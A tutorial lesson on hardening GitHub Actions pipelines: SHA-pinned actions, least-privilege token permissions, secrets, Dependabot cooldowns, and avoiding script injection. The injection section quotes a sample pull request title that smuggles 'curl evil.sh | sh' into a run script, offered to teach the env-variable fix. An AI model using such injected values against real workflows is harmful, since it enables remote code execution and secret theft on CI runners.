# Secure and fast

> Pin actions, limit the token, avoid script injection, keep dependencies fresh, and debug well.

**Time:** 20 minutes

## Goal

Know the habits that keep a pipeline safe and quick, and why every workflow here looks the way it
does.

## Pin actions to a commit SHA

```yaml
- uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
```

A tag like `@v7` can be moved to different code at any time; a commit SHA cannot. Pinning means a
compromised or changed action cannot slip into your pipeline. The comment keeps it readable, and
Dependabot updates both.

## Give the token the least it needs

Start every workflow with `permissions: contents: read`, then raise single jobs:

| Job             | Extra permission                  |
| --------------- | --------------------------------- |
| Release         | `contents: write`                 |
| Publish image   | `packages: write`                 |
| Deploy to Pages | `pages: write`, `id-token: write` |

Pull requests from forks always get a read-only token and no secrets.

## Never paste untrusted text into a script

Issue titles, branch names and pull request bodies are written by anyone. This is unsafe:

```yaml
run: echo "Title: ${{ github.event.pull_request.title }}"
```

A title like `"; curl evil.sh | sh; "` becomes part of the script. Pass it through `env` instead,
so the shell treats it as plain data:

```yaml
env:
  TITLE: ${{ github.event.pull_request.title }}
run: echo "Title: $TITLE"
```

Every workflow in this repository passes values this way. Also avoid `pull_request_target` unless
you understand it: it runs with secrets on code from forks.

## Secrets

Store them in **Settings**, **Secrets and variables**, **Actions**, and read them as
`${{ secrets.NAME }}`. GitHub masks them in logs. For cloud deploys, prefer OIDC
(`id-token: write`) over long-lived keys.

## Keep it current, safely

`.github/dependabot.yml` opens weekly pull requests for actions and npm packages, with a cooldown:

```yaml
- package-ecosystem: github-actions
  directories: ['/', '/.github/actions/setup-backend']
  schedule:
    interval: weekly
  cooldown:
    default-days: 14
```

Nothing is proposed until it has been public for 14 days, which gives the community time to catch
a bad release.

## Keep it fast

- `paths:` filters skip irrelevant runs.
- `concurrency` with `cancel-in-progress` drops outdated runs.
- `timeout-minutes` on every job stops runaway runs.
- Caches for dependencies; small artifacts with short retention.

## Debugging

- Re-run a failed job with **Re-run jobs**, ticking **Enable debug logging** for extra detail.
- `run: env | sort` shows what a step can see (secrets stay masked).
- [actionlint](https://github.com/rhysd/actionlint) checks workflow files for mistakes before you
  push.

## Check it works

Search the repository for `${{ github.event`. The only uses are inside `env:` blocks, never inside
a `run:` script.

## Exercise

You made it. Take one of your own repositories and add a CI workflow like `ci.yml`: least
privilege, pinned actions, a matrix, a cache and a timeout. Share the green run with the group.
